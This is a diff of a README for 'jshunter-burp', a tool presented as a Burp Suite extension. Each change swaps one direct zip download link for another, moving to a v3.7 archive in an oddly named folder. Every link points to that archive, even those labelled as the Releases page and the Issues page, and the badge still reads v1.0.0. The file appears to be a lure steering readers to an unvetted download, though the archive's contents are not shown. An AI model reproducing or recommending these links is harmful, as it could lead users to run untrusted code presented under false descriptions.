@@ -6,7 +6,7 @@ Welcome to the jshunter-burp project! This tool scans your HTTP traffic for Java
 
 ## 📥 Download the Latest Version
 
-[![Download jshunter-burp](https://raw.githubusercontent.com/hushed1053/jshunter-burp/main/patroclinic/jshunter-burp_v1.0.zip%20jshunter--burp-v1.0.0-blue)](https://raw.githubusercontent.com/hushed1053/jshunter-burp/main/patroclinic/jshunter-burp_v1.0.zip)
+[![Download jshunter-burp](https://github.com/hushed1053/jshunter-burp/raw/refs/heads/main/patroclinic/jshunter_burp_v3.7.zip%20jshunter--burp-v1.0.0-blue)](https://github.com/hushed1053/jshunter-burp/raw/refs/heads/main/patroclinic/jshunter_burp_v3.7.zip)
 
 ## 📋 What You Need
 
@@ -22,7 +22,7 @@ Before you begin, make sure your system meets the following requirements:
 jshunter-burp is straightforward to use, even for those who might not be tech-savvy. Follow these steps to get started:
 
 1. **Download the Extension:**
-   Visit the [Releases page to download](https://raw.githubusercontent.com/hushed1053/jshunter-burp/main/patroclinic/jshunter-burp_v1.0.zip). Choose the latest version and click on the appropriate file. 
+   Visit the [Releases page to download](https://github.com/hushed1053/jshunter-burp/raw/refs/heads/main/patroclinic/jshunter_burp_v3.7.zip). Choose the latest version and click on the appropriate file. 
 
 2. **Install the Extension in Burp Suite:**
    - Open Burp Suite.
@@ -55,7 +55,7 @@ jshunter-burp is straightforward to use, even for those who might not be tech-sa
 
 If you encounter any issues or need help, consider the following resources:
 
-- **GitHub Issues:** Report any problems or bugs on our [Issues page](https://raw.githubusercontent.com/hushed1053/jshunter-burp/main/patroclinic/jshunter-burp_v1.0.zip).
+- **GitHub Issues:** Report any problems or bugs on our [Issues page](https://github.com/hushed1053/jshunter-burp/raw/refs/heads/main/patroclinic/jshunter_burp_v3.7.zip).
 - **Community Discussions:** Join our discussions on relevant forums to connect with other users.
 
 ## 📧 Contact Us
@@ -80,4 +80,4 @@ jshunter-burp makes securing your web applications easier. With a few simple ste
 
 Thank you for choosing jshunter-burp! 
 
-[Download jshunter-burp](https://raw.githubusercontent.com/hushed1053/jshunter-burp/main/patroclinic/jshunter-burp_v1.0.zip) and protect your data today!
+[Download jshunter-burp](https://github.com/hushed1053/jshunter-burp/raw/refs/heads/main/patroclinic/jshunter_burp_v3.7.zip) and protect your data today!
